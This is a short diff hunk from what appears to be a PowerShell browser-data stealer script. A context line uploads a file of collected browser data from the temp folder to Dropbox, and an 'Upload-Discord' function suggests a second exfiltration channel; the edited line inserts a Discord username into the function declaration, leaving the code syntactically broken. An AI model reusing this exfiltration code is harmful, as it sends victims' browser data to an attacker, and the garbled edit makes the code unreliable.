@@ -72,7 +72,7 @@ if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\--BrowserDat
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-function Upload-Discord {
+function Upload-Discord {shoe lover#5840
 
 [CmdletBinding()]
 param (
